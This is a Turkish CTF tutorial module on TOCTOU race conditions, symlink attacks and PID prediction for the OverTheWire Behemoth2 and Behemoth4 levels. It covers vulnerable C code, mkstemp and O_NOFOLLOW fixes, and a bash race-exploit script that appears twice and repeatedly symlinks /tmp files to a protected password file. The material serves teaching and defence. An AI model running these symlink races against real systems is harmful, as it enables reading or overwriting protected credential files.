# Modül 2 — Zamanlama ve Tahmin Saldırıları: Race Condition & PID Prediction

> **İlgili Seviyeler:** Behemoth2, Behemoth4  
> **Anahtar Kavramlar:** TOCTOU, symlink saldırısı, PID tahmini, `/proc` filesystem  
> **Kazanım:** İki olayın arasındaki milisaniyeyi sömürmek

---

## 🧠 1. Büyük Resim (Konsept Nedir?)

Bir kasabanın tek ATM'si düşün. Bakiyeni kontrol etmek için kart takıyorsun — sistem 500 TL olduğunu görüyor. Tam para çekme işlemi onaylanmadan önce, arkadaşın başka bir şubeden de aynı anda çekim yapıyor. Her iki işlem de "500 TL var" diye onaylandı ama hesapta aslında 500 TL vardı. Bu bir **race condition** — iki işlemin aynı kaynağa eş zamanlı erişmesinden doğan tutarsızlık.

Yazılım dünyasında da aynısı olur. Bir program bir kaynağı **kontrol eder**, sonra o kaynağı **kullanır**. Bu iki eylem arasındaki — bazen sadece birkaç milisaniyelik — pencere, saldırgan için bir kapıdır.

Bu pencereye resmi adıyla **TOCTOU** denir: **Time of Check to Time of Use**.

```
Zaman →
─────────────────────────────────────────────────────────────
Program:   [KONTROL] /tmp/X yok mu?        [KULLAN] /tmp/X yaz
                                 ↑
Saldırgan:                   [SYMLINK] /tmp/X → /etc/hedef
─────────────────────────────────────────────────────────────
                  Saldırı penceresi (ms ~ sn)
```

Program dosyanın olmadığını kontrol etti, oluşturmaya karar verdi — ama tam o anda saldırgan oraya bir sembolik link yerleştirdi. Program artık kendi güvenli dosyasına değil, saldırganın seçtiği hedefe yazıyor.

---

## 🔍 2. Zafiyetin Anatomisi (Neden Kaynaklanıyor?)

### Behemoth2 — `/tmp` dosyası ile symlink saldırısı

Binary şuna benzer bir şey yapıyor:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char filename[64];
    // Geçici dosya adını PID ile oluştur
    snprintf(filename, sizeof(filename), "/tmp/behemoth2.%d", getpid());

    // Dosya var mı diye kontrol et (TOCTOU başlıyor)
    if (access(filename, F_OK) == 0) {
        printf("Dosya zaten var!\n");
        return 1;
    }

    // Kısa bir şey yap (bu aralık saldırı penceresidir)
    sleep(1);

    // Dosyayı oluştur ve yaz (TOCTOU bitiyor — ama artık geç)
    FILE *f = fopen(filename, "w");
    fprintf(f, "some_data\n");
    fclose(f);
}
```

`access()` fonksiyonu bir dosyanın varlığını veya izinlerini kontrol eder ama **atomik değildir** — kontrol ile kullanım arasında zaman vardır.

```bash
# ltrace çıktısı:
access("/tmp/behemoth2.12345", 0)        = -1  (dosya yok, devam)
# ← BURADA SALDIRI PENCERESİ
fopen("/tmp/behemoth2.12345", "w")       = 0x...  (ama artık symlink!)
fprintf(...)                             # hedef dosyaya yazıyor
```

#### Symlink nedir ve nasıl çalışır?

```bash
# Normal dosya
echo "veri" > /tmp/normal.txt

# Symlink — normal.txt'e işaret eden bir kısayol
ln -sf /tmp/normal.txt /tmp/link.txt

# link.txt'e yazmak aslında normal.txt'e yazar
echo "yeni" > /tmp/link.txt
cat /tmp/normal.txt  # → "yeni"
```

Saldırıda şunu yapıyoruz:

```bash
ln -sf /etc/behemoth_pass/behemoth3 /tmp/behemoth2.12345
# Artık program bu "dosyaya" yazdığında, aslında şifreyi okuyoruz
```

### Behemoth4 — PID tahmini

Behemoth4 benzer bir yapı kullanıyor ama bu sefer binary `/tmp/<PID>` formatında bir dosya arıyor. Saldırı stratejisi:

1. Binary'yi arka plana al: `/behemoth/behemoth4 &`
2. PID'ini öğren: `echo $!`
3. O isimde bir symlink oluştur

#### Linux'ta PID nasıl atanır?

Linux çekirdeği PID'leri **sıralı olarak** atar (varsayılan ayarlarda). Sistem açıldığında 1'den başlar ve her yeni süreçle artar. Bu demektir ki:

```bash
$ cat /proc/sys/kernel/pid_max
4194304          # Maksimum PID değeri

$ echo $$
12450            # Mevcut shell'in PID'i

$ sleep 10 &
[1] 12451        # Bir sonraki PID tahmin edilebilir!
```

Bu tahmin edilebilirlik, PID'e göre dosya oluşturan programları savunmasız bırakır.

#### `/proc` filesystem nedir?

`/proc`, çekirdeğin süreç bilgilerini sanal dosyalar üzerinden sunduğu özel bir dosya sistemidir. Diskte gerçek bir veri yoktur — her okuma işleminde çekirdek canlı veriyi döndürür.

```bash
/proc/
├── 1/              # init sürecinin bilgileri
│   ├── cmdline     # Komut satırı argümanları
│   ├── maps        # Bellek haritası
│   ├── fd/         # Açık dosya tanımlayıcıları
│   └── status      # UID, GID, durum bilgisi
├── 12451/          # Behemoth4 süreci
│   └── ...
└── self/           # Çalışan sürecin kendi dizini
```

```bash
# Çalışan bir sürecin hangi dosyaları açtığını gör
ls -la /proc/12451/fd/

# Sürecin komut satırını oku
cat /proc/12451/cmdline

# Sürecin bellek haritasını incele (stack/heap adresleri)
cat /proc/12451/maps
```

---

## 🛠️ 3. Defansif Bakış Açısı (Nasıl Düzeltilir?)

### `access()` + `open()` yerine `mkstemp()` kullan

**Sorunlu kod:**
```c
// TOCTOU açığı var
if (access("/tmp/myfile", F_OK) == 0) { return; }
FILE *f = fopen("/tmp/myfile", "w");
```

**Güvenli alternatif:**
```c
// mkstemp() hem dosyayı oluşturur hem de fd döndürür — atomik
char template[] = "/tmp/myapp-XXXXXX";
int fd = mkstemp(template);
if (fd == -1) { perror("mkstemp"); return; }
// template artık benzersiz, var olan bir dosyanın adını içeriyor
FILE *f = fdopen(fd, "w");
```

`mkstemp()` dosya adı oluşturma ve açma işlemini tek atomik adımda yapar — araya girilecek pencere yoktur.

### Sembolik linklere karşı `O_NOFOLLOW` kullan

```c
// Symlink ise aç — savunmasız
int fd = open(filename, O_WRONLY | O_CREAT);

// Symlink ise hata ver — güvenli
int fd = open(filename, O_WRONLY | O_CREAT | O_NOFOLLOW);
if (fd == -1 && errno == ELOOP) {
    fprintf(stderr, "Symlink saldırısı tespit edildi!\n");
    return -1;
}
```

### `/tmp`'de sticky bit neden yeterli değildir?

`/tmp` dizininin `sticky bit`'i (`drwxrwxrwt`) sadece başkasının dosyasını silmeni engeller, symlink oluşturmayı engellemez. Bu yüzden güvenli geçici dosya kullanımı kritiktir.

---

## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar

### Tuzak 1 — Saldırı penceresini kaçırmak

Race condition'larda zamanlama her şeydir. Binary hızlı çalışıyorsa pencere çok kısa olabilir. Symlink'i binary başlamadan **önce** oluşturmayı dene, ya da `while true` döngüsüyle sürekli dene.

```bash
# Döngü ile symlink saldırısı
while true; do
    ln -sf /etc/behemoth_pass/behemoth3 /tmp/behemoth2.* 2>/dev/null
done &
RACE_PID=$!
/behemoth/behemoth2
kill $RACE_PID   # Döngüyü öldürmeyi unutma!
```

### Tuzak 2 — Arka plan sürecini `kill` etmeyi unutmak

`&` ile başlattığın döngüyü kill etmezsen, oturum kapandıktan sonra bile arka planda çalışmaya devam eder. Her zaman `RACE_PID=$!` ile PID'i kaydet ve işin bitince `kill $RACE_PID` çalıştır.

### Tuzak 3 — PID hesaplamasında yanılmak

Behemoth4'te binary'yi `&` ile çalıştırınca birden fazla süreç üretebilir (fork). `$!` sadece en son arka plan sürecinin PID'ini verir. `ltrace` çıktısında hangi PID formatında dosya aradığını doğrula.

```bash
# PID'i doğrula
/behemoth/behemoth4 &
echo "Tahmin edilen PID: $!"
ltrace /behemoth/behemoth4 2>&1 | grep fopen
```

### Tuzak 4 — `/tmp` dizinini kirletmek

Birden fazla deneme sonrasında `/tmp` altında sahte dosyalar kalabilir. Başlamadan önce temizle:

```bash
rm -f /tmp/behemoth2.* /tmp/behemoth4.*
```
---
### 💡 Pro-Tip: Temiz ve Güvenli Race Scriptleri (`trap` Kullanımı)

Race condition zafiyetlerini sömürürken en sık kullandığımız yöntem, arka planda sonsuz döngüler (`while true; do ... done &`) başlatarak sembolik linkleri (symlink) saliseler içinde sürekli değiştirmektir. Ancak yeni başlayanların yaptığı en büyük hata, exploit başarılı olduğunda veya `Ctrl+C` ile scripti durdurduğunda arka plandaki bu süreçleri kendi haline bırakmaktır.

#### 🧟‍♂️ Sunucuyu Kitleyen Zombi Süreçler
Eğer arka plandaki döngü sürecini (process) manuel olarak öldürmezseniz, siz exploit scriptinden çıksanız bile o döngü arka planda işlemciyi (CPU) son hızda tüketmeye devam eder. Paylaşımlı CTF veya OverTheWire gibi wargame sunucularında arkada onlarca zombi süreç bırakmak, sunucunun tamamen kilitlenmesine yol açar ve diğer oyuncuların platformu kullanmasını engeller (bu durum genellikle platform adminleri tarafından banlanma sebebidir).

#### 🛠️ Çözüm: Bash `trap` Mekanizması
Yazdığın exploit scriptinin başına bir `trap` (tuzak/yakalayıcı) ekleyerek, script herhangi bir sebeple kapandığında (ister sen `Ctrl+C` yap, ister script hata verip kapansın) arka plandaki tüm süreçlerin ve geçici dosyaların **otomatik olarak** temizlenmesini sağlayabilirsin.

İşte endüstri standartlarında, temiz bir race condition exploit scripti şablonu:

```bash
#!/bin/bash

# Script sonlandırıldığında çalışacak temizlik fonksiyonu
temizlik() {
    echo -e "\n[!] Sinyal yakalandı! Temizlik yapılıyor, zombi süreçler öldürülüyor..."
    # Arka plandaki race sürecini öldür
    kill $RACE_PID 2>/dev/null
    # /tmp altında oluşturulan geçici dosyaları temizle
    rm -f /tmp/behemoth2.*
    exit
}

# INT (Ctrl+C), TERM (Kapatma) ve EXIT (Normal çıkış) sinyallerini yakala, 
# bu sinyaller geldiğinde yukarıdaki 'temizlik' fonksiyonunu çalıştır.
trap temizlik INT TERM EXIT

# 1. Sembolik link değiştirme döngüsünü ARKA PLANDA (&) başlat
while true; do
    ln -sf /tmp/guvenli /tmp/tuzak
    ln -sf /etc/behemoth_pass/behemoth3 /tmp/tuzak
done &

# 2. En son başlatılan arka plan sürecinin PID'sini (Process ID) kaydet
RACE_PID=$! 

echo "[+] Race condition döngüsü arka planda başladı. (PID: $RACE_PID)"
echo "[+] Hedef program tetikleniyor..."

# 3. Ana saldırı döngüsü (hedef programı defalarca çalıştır)
for i in $(seq 1 200); do
    /behemoth/behemoth2 /tmp/tuzak 2>/dev/null
done

# Script normal olarak bitse bile en üstteki trap mekanizması devreye girer 
# ve arka plandaki süreci tertemiz arkasında iz bırakmadan kapatır.
```
Bu refleksi kazanmak, sadece CTF sunucularında saygı görmeni sağlamaz; gerçek dünya sızma testlerinde (pentest) arkanda çalışan zombi süreçler bırakarak hedef sistemi çökertme riskini de sıfıra indirir.

## 💡 Pro-Tip: Temiz Race Condition Scriptleri — `trap` Kullanımı

Race condition saldırılarında arka planda sonsuz döngüler (`while true; do ... done &`) başlatırız. En büyük hata: exploit başarılı olduğunda veya `Ctrl+C` ile çıktığında bu döngüleri kendi haline bırakmak.

**Neden tehlikeli?** Paylaşımlı CTF veya wargame sunucularında arka planda kalan döngüler CPU'yu sonuna kadar tüketir, sunucuyu kilitler ve diğer oyuncuları etkiler. Genellikle banlanma sebebidir.

**Çözüm:** Script başına `trap` ekle — script herhangi bir sebeple kapandığında (Ctrl+C, hata, normal çıkış) arka plandaki süreçler **otomatik olarak** temizlenir.

```bash
#!/bin/bash

# Script kapandığında çalışacak temizlik fonksiyonu
temizlik() {
    echo -e "\n[!] Sinyal yakalandı! Temizlik yapılıyor..."
    kill $RACE_PID 2>/dev/null      # Arka plandaki race döngüsünü öldür
    rm -f /tmp/behemoth2.*          # Geçici dosyaları temizle
    exit
}

# INT (Ctrl+C), TERM ve EXIT sinyallerini yakala
trap temizlik INT TERM EXIT

# 1. Symlink döngüsünü arka planda başlat
while true; do
    ln -sf /tmp/guvenli /tmp/tuzak
    ln -sf /etc/behemoth_pass/behemoth3 /tmp/tuzak
done &
RACE_PID=$!

echo "[+] Race döngüsü başladı. (PID: $RACE_PID)"
echo "[+] Hedef tetikleniyor..."

# 2. Hedef programı defalarca çalıştır
for i in $(seq 1 200); do
    /behemoth/behemoth2 /tmp/tuzak 2>/dev/null
done

# Script normal bitse bile trap devreye girer ve temizler
```

Bu alışkanlık sadece CTF'lerde değil, gerçek dünya sızma testlerinde de hedef sistemde iz bırakmamak için kritiktir.

---

## Özet
```
Race Condition (TOCTOU)
         │
         ▼
   [KONTROL] ──── pencere ────► [KULLAN]
                     │
              Saldırgan burada
              symlink yerleştirir
                     │
                     ▼
       Program kendi dosyasına değil
       saldırganın hedefine yazar

Savunma:
  access() + fopen()   →  mkstemp()        (atomik)
  open()               →  open(O_NOFOLLOW)  (symlink engel)
  PID'e göre dosya     →  random token      (tahmin edilemez)
```

---

## Kaynaklar

- `man 2 access` — BUGS bölümünü özellikle oku (TOCTOU açıkça belirtilmiş)
- `man 3 mkstemp` — güvenli geçici dosya oluşturma
- `man 2 open` — `O_NOFOLLOW`, `O_CREAT | O_EXCL` flag'leri
- [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [Linux /proc filesystem — kernel.org](https://www.kernel.org/doc/html/latest/filesystems/proc.html)
